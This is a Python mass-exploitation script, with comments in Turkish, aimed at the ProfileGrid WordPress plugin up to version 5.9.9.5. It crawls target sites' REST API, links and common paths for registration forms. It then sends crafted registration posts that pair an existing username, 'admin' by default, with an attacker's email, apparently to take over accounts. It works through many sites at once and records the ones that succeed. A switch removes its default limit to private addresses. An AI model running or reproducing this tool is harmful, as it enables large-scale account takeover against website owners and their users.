#!/usr/bin/env python3
"""
ProfileGrid <= 5.9.9.5 Mass Exploit - ASYNC with REST API Discovery
- REST API, sitemap, homepage linkler, common paths
- --no-rest ile REST'i kapatabilirsin
- Başarılı hedefler success.txt'ye yazılır
"""

from __future__ import annotations

import argparse
import asyncio
import html
import ipaddress
import json
import re
import socket
import sys
import urllib.parse
from html.parser import HTMLParser
from typing import List, Set

try:
    import aiohttp
    import aiohttp.client_exceptions
except ImportError:
    print("[-] aiohttp kurulu değil. Lütfen 'pip install aiohttp' ile kurun.")
    sys.exit(1)

# ------------- BANNER -------------
BANNER = r"""
   _____ ______ _____   _____ ______ _____
  / ____|  ____|  __ \ / ____|  ____|_   _|
 | (___ | |__  | |__) | |  __| |__    | |
  \___ \|  __| |  _  /| | |_ |  __|   | |
  ____) | |____| | \ \| |__| | |____ _| |_
 |_____/|______|_|  \_\\_____|______|_____|

              SERGEI
          Telegram: @sergeibaba
"""

# ------------- HTML PARSERS -------------
class FormParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.forms: list[dict[str, object]] = []
        self._current: dict[str, object] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr = {k.lower(): (v or "") for k, v in attrs}
        if tag.lower() == "form":
            self._current = {"attrs": attr, "inputs": []}
            return
        if self._current is not None and tag.lower() in {"input", "textarea", "select"}:
            inputs = self._current["inputs"]
            assert isinstance(inputs, list)
            inputs.append(attr)

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form" and self._current is not None:
            self.forms.append(self._current)
            self._current = None


class LinkParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag.lower() != "a":
            return
        attr = {k.lower(): (v or "") for k, v in attrs}
        href = attr.get("href", "")
        if href:
            self.links.append(html.unescape(href))


# ------------- UTILITY FUNCTIONS -------------
def fail(message: str) -> None:
    print(f"[-] {message}", file=sys.stderr)
    raise SystemExit(1)


def is_private_target(url: str) -> bool:
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    if not host:
        return False
    if host in {"localhost", "127.0.0.1", "::1"} or host.endswith(".local"):
        return True
    try:
        addresses = socket.getaddrinfo(host, parsed.port or 80, type=socket.SOCK_STREAM)
    except socket.gaierror:
        return False
    for item in addresses:
        address = item[4][0]
        try:
            ip = ipaddress.ip_address(address)
        except ValueError:
            continue
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return True
    return False


def parse_field_overrides(values: list[str]) -> dict[str, str]:
    overrides: dict[str, str] = {}
    for item in values:
        if "=" not in item:
            fail(f"--field bicimi alan=deger olmali: {item}")
        key, value = item.split("=", 1)
        key = key.strip()
        if not key:
            fail("--field icinde alan adi bos olamaz")
        overrides[key] = value
    return overrides


def is_profilegrid_form(html_content: str) -> bool:
    """Bir sayfanın ProfileGrid kayıt formu içerip içermediğini kontrol eder."""
    h = html_content.lower()
    if 'pm_regform_' in h:
        return True
    if 'name="reg_form_submit"' in h or "name='reg_form_submit'" in h:
        return True
    if 'pm_registration_nonce' in h:
        return True
    if '[profilegrid_register' in h:
        return True
    return False


# ------------- ASYNC HTTP -------------
async def async_request(
    session: aiohttp.ClientSession,
    url: str,
    *,
    data: dict[str, str] | None = None,
    timeout: int = 15,
) -> tuple[int, str, str]:
    """Asenkron HTTP GET/POST, SSL hatalarını yoksayar."""
    headers = {"User-Agent": "ProfileGrid-5995-mass-async/1.0"}
    try:
        if data:
            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as resp:
                body = await resp.text(errors="replace")
                return resp.status, str(resp.url), body
        else:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                body = await resp.text(errors="replace")
                return resp.status, str(resp.url), body
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        raise Exception(f"HTTP hatası: {e}")


# ------------- SYNC HELPERS (HTML parsing) -------------
def parse_forms(body: str) -> list[dict[str, object]]:
    parser_obj = FormParser()
    parser_obj.feed(body)
    return parser_obj.forms


def find_profilegrid_form(forms: list[dict[str, object]]) -> dict[str, object] | None:
    for form in forms:
        attrs = form["attrs"]
        inputs = form["inputs"]
        assert isinstance(attrs, dict)
        assert isinstance(inputs, list)
        names = {field.get("name", "") for field in inputs}
        form_id = attrs.get("id", "")
        form_name = attrs.get("name", "")
        if "reg_form_submit" in names or str(form_id).startswith("pm_regform_") or str(form_name).startswith("pm_regform_"):
            return form
    return None


def choose_profilegrid_form(forms: list[dict[str, object]]) -> dict[str, object]:
    form = find_profilegrid_form(forms)
    if form is not None:
        return form
    fail("ProfileGrid registration form bulunamadi.")


def form_action(base_url: str, form: dict[str, object]) -> str:
    attrs = form["attrs"]
    assert isinstance(attrs, dict)
    action = str(attrs.get("action", "")).strip()
    if not action:
        return base_url
    return urllib.parse.urljoin(base_url, html.unescape(action))


def collect_form_values(form: dict[str, object]) -> dict[str, str]:
    inputs = form["inputs"]
    assert isinstance(inputs, list)
    data: dict[str, str] = {}
    for field in inputs:
        name = field.get("name", "")
        if not name:
            continue
        input_type = field.get("type", "text").lower()
        if input_type in {"button", "file", "image", "reset"}:
            continue
        if input_type in {"checkbox", "radio"} and "checked" not in field:
            continue
        data[str(name)] = html.unescape(str(field.get("value", "")))
    data.setdefault("reg_form_submit", "Submit")
    return data


def print_payload(data: dict[str, str]) -> None:
    print("[+] POST payload:")
    for key in sorted(data):
        value = data[key]
        if "pass" in key.lower() or "nonce" in key.lower():
            value = "<present>"
        print(f"    {key}={value}")


def print_response_snippets(body: str) -> None:
    snippets = re.findall(r'<div[^>]+class="[^"]*pm-(?:error|message)[^"]*"[^>]*>(.*?)</div>', body, flags=re.I | re.S)
    if not snippets:
        return
    print("[+] Response snippets:")
    for snippet in snippets[:5]:
        text = re.sub(r"<[^>]+>", " ", snippet)
        text = " ".join(html.unescape(text).split())
        if text:
            print(f"    {text[:240]}")


# ------------- DISCOVERY -------------
def normalize_url(base: str, href: str) -> str | None:
    absolute = urllib.parse.urljoin(base, href)
    parsed = urllib.parse.urlparse(absolute)
    if parsed.scheme not in {"http", "https"}:
        return None
    base_parsed = urllib.parse.urlparse(base)
    if (base_parsed.scheme, base_parsed.hostname) != (parsed.scheme, parsed.hostname):
        return None
    return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", "", parsed.query, ""))


async def fetch_rest_pages(session: aiohttp.ClientSession, base_url: str, max_pages: int = 10) -> List[str]:
    """WordPress REST API'den ProfileGrid içeren sayfaların URL'lerini döndürür."""
    urls = []
    for page in range(1, max_pages + 1):
        api_url = urllib.parse.urljoin(base_url, f"/wp-json/wp/v2/pages?per_page=100&page={page}")
        try:
            status, _, body = await async_request(session, api_url, timeout=10)
        except Exception:
            break
        if status != 200:
            break
        try:
            pages = json.loads(body)
        except json.JSONDecodeError:
            break
        if not isinstance(pages, list) or not pages:
            break
        for p in pages:
            if not isinstance(p, dict):
                continue
            link = p.get("link")
            content = p.get("content", {})
            rendered = content.get("rendered", "") if isinstance(content, dict) else ""
            title = p.get("title", {})
            title_text = title.get("rendered", "") if isinstance(title, dict) else ""
            haystack = f"{link} {title_text} {rendered}".lower()
            if link and ('[profilegrid_register' in haystack or 'pm_regform_' in haystack or 'reg_form_submit' in haystack or 'profilegrid_register' in haystack):
                urls.append(link)
    return urls


async def discover_for_single_base(session: aiohttp.ClientSession, base_url: str, use_rest: bool = True) -> List[str]:
    """Tek bir base URL için keşif: REST, homepage linkler, common paths."""
    if not base_url.endswith("/"):
        base_url += "/"

    candidates: Set[str] = set()

    # 1. REST API (isteğe bağlı)
    if use_rest:
        for url in await fetch_rest_pages(session, base_url):
            if url:
                candidates.add(url)

    # 2. Ana sayfadan linkleri al
    try:
        status, final_url, body = await async_request(session, base_url, timeout=10)
        if status == 200:
            parser_obj = LinkParser()
            parser_obj.feed(body)
            for link in parser_obj.links:
                normalized = normalize_url(base_url, link)
                if normalized:
                    candidates.add(normalized)
    except Exception:
        pass

    # 3. Common paths
    common = [
        "registration/", "register/", "signup/", "sign-up/",
        "profilegrid-register/", "profilegrid-registration/",
        "user-registration/", "groups/"
    ]
    for path in common:
        candidates.add(urllib.parse.urljoin(base_url, path))

    # 4. Her adayı kontrol et, form imzası olanları topla
    found = []
    for url in candidates:
        try:
            status, final_url, body = await async_request(session, url, timeout=10)
        except Exception:
            continue
        if status >= 400:
            continue
        if is_profilegrid_form(body):
            found.append(final_url)
    return found


# ------------- ASYNC ATTACK -------------
async def attack_target(
    session: aiohttp.ClientSession,
    registration_url: str,
    args: argparse.Namespace,
    semaphore: asyncio.Semaphore,
) -> tuple[str, bool, str]:
    """Tek bir registration URL'sine saldırır."""
    async with semaphore:
        print(f"[+] Saldırı: {registration_url}")

        try:
            status, final_url, body = await async_request(session, registration_url, timeout=15)
        except Exception as e:
            return registration_url, False, f"GET hatası: {e}"
        if status >= 400:
            return registration_url, False, f"GET başarısız: HTTP {status}"

        try:
            form = choose_profilegrid_form(parse_forms(body))
        except SystemExit as e:
            return registration_url, False, f"Form bulunamadı: {e}"

        # user_login kontrolü
        inputs = form.get("inputs", [])
        has_user_login = any(field.get("name") == "user_login" for field in inputs)
        if has_user_login and not args.force:
            return registration_url, False, "user_login render ediliyor, atlandı (--force ile zorla)"

        action_url = form_action(final_url, form)
        data = collect_form_values(form)

        data["user_login"] = args.existing_login
        data["user_email"] = args.new_email
        data["user_pass"] = data.get("user_pass") or args.password
        data["confirm_pass"] = data.get("confirm_pass") or args.password
        data.update(parse_field_overrides(args.field))

        if not args.send:
            return registration_url, False, "Dry-run"

        try:
            post_status, post_url, post_body = await async_request(session, action_url, data=data, timeout=20)
        except Exception as e:
            return registration_url, False, f"POST hatası: {e}"

        print(f"[+] {registration_url} HTTP {post_status}")
        print_response_snippets(post_body)

        if post_status < 200 or post_status >= 600:
            return registration_url, False, f"HTTP {post_status}"

        lowered = post_body.lower()
        if "pm-error" in lowered:
            return registration_url, False, "pm-error var"

        if any(marker in lowered for marker in ("success", "registered", "already registered")):
            return registration_url, True, "Başarılı!"
        else:
            return registration_url, True, "Muhtemelen başarılı (pm-error yok)"


# ------------- MAIN -------------
async def async_main(args: argparse.Namespace) -> None:
    print(BANNER)

    # Hedef listesini oku
    raw_targets: list[str] = []
    if args.list:
        try:
            with open(args.list, "r", encoding="utf-8") as f:
                raw_targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            fail(f"Liste dosyası okunamadı: {e}")
        if not raw_targets:
            fail("Liste dosyası boş.")
    elif args.registration_url:
        raw_targets = [args.registration_url]
    else:
        fail("Hedef belirtin: --list veya registration_url")

    # Public hedef kontrolü
    if not args.allow_public_target:
        filtered = []
        for url in raw_targets:
            if is_private_target(url):
                filtered.append(url)
            else:
                print(f"[-] {url} public, atlanıyor (--allow-public-target ile zorlayın).")
        raw_targets = filtered
        if not raw_targets:
            fail("Tüm hedefler public, işlem yapılamaz.")

    connector = aiohttp.TCPConnector(ssl=False, limit=args.concurrency * 2)
    async with aiohttp.ClientSession(connector=connector) as session:
        # KEŞİF AŞAMASI (async)
        all_registration_urls: list[str] = []
        if args.auto_discover:
            print(f"[+] Keşif başlıyor ({len(raw_targets)} base URL)...")
            sem = asyncio.Semaphore(args.concurrency)
            async def discover_one(base_url: str) -> List[str]:
                async with sem:
                    try:
                        print(f"[+] Keşif: {base_url}")
                        return await discover_for_single_base(session, base_url, use_rest=not args.no_rest)
                    except Exception as e:
                        print(f"[-] {base_url} keşif hatası: {e}")
                        return []
            tasks = [discover_one(base) for base in raw_targets]
            results = await asyncio.gather(*tasks)
            for urls in results:
                all_registration_urls.extend(urls)
            if not all_registration_urls:
                fail("Hiç registration URL bulunamadı.")
            print(f"[+] {len(all_registration_urls)} registration URL bulundu.")
        else:
            all_registration_urls = raw_targets

        # SALDIRI AŞAMASI
        total = len(all_registration_urls)
        print(f"[+] Saldırı başlıyor ({total} hedef)...")
        if not args.send:
            print("[!] UYARI: --send kullanılmadı, dry-run.")

        sem = asyncio.Semaphore(args.concurrency)
        tasks = [attack_target(session, url, args, sem) for url in all_registration_urls]
        results = await asyncio.gather(*tasks)

    successful = []
    for url, success, msg in results:
        if success:
            successful.append(url)
            print(f"[+] BAŞARILI: {url} -> {msg}")
            try:
                with open(args.output_success, "a", encoding="utf-8") as f:
                    f.write(url + "\n")
            except Exception as e:
                print(f"[-] Dosyaya yazarken hata: {e}")
        else:
            print(f"[-] Başarısız: {url} -> {msg}")

    print(f"\n{'='*60}")
    print(f"[+] Tarama tamamlandı. Başarılı: {len(successful)} / {total}")
    print(f"[+] Başarılı hedefler kaydedildi: {args.output_success}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ProfileGrid <= 5.9.9.5 Mass Exploit - Async with REST",
        epilog="Örnek: python3 mass.py --list list.txt --auto-discover --new-email atak@example.com --send --concurrency 30"
    )
    parser.add_argument("registration_url", nargs="?", help="Tekil hedef URL (doğrudan registration sayfası)")
    parser.add_argument("--list", metavar="FILE", help="Dosyadan base URL listesi")
    parser.add_argument("--auto-discover", action="store_true", help="Her URL için auto-discover yap (REST + linkler + common paths)")
    parser.add_argument("--no-rest", action="store_true", help="REST API keşfini kapat (hızlanır)")
    parser.add_argument("--force", action="store_true", help="user_login olsa bile dene")
    parser.add_argument("--output-success", default="success.txt", help="Başarılı hedeflerin yazılacağı dosya")
    parser.add_argument("--existing-login", default="admin", help="Hedef kullanıcı adı (varsayılan: admin)")
    parser.add_argument("--new-email", required=True, help="Saldırgan e-posta adresi")
    parser.add_argument("--password", default="PocPassword123!", help="Kayıt şifresi")
    parser.add_argument("--field", action="append", default=[], help="Ek form alanı")
    parser.add_argument("--send", action="store_true", help="POST isteğini gerçekten gönder")
    parser.add_argument("--allow-public-target", action="store_true", help="Public hedeflere izin ver")
    parser.add_argument("--concurrency", type=int, default=30, help="Eşzamanlı işlem sayısı (varsayılan: 30)")

    args = parser.parse_args()

    try:
        asyncio.run(async_main(args))
    except KeyboardInterrupt:
        print("\n[!] Kullanıcı tarafından durduruldu.")
        sys.exit(1)


if __name__ == "__main__":
    main()
